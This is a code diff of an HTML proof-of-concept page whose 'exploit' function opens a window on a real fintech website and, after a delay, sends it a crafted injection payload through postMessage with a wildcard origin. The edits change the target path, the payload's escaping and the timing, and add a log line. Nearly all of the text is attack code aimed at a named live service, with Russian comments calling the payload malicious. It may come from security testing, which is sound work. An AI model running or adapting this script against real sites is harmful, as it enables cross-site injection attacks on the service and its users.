@@ -12,15 +12,16 @@
     <script>
         function exploit() {
             // Открываем целевую страницу в новом окне
-            var targetWindow = window.open('https://web.koho.ca');
+            var targetWindow = window.open('https://web.koho.ca/.well-known/assetlinks.json');
 
             // Вредоносное сообщение
-            var payload = `{"key":"xrotx1nm93%2527%2522%60'%22/xrotx1nm93/><xrotx1nm93/\>rfk4zqk4p0&"}`;
+            var payload = '{"key":"xrotx1nm93%2527%2522`\'\"/xrotx1nm93/><xrotx1nm93/\\>rfk4zqk4p0&"}';
 
-            // Отправка сообщения через 2 секунды после открытия страницы
+            // Отправка сообщения через 5 секунд после открытия страницы
             setTimeout(function() {
+                console.log("Sending payload...");
                 targetWindow.postMessage(payload, '*');
-            }, 2000);
+            }, 5000);
         }
     </script>
 </body>
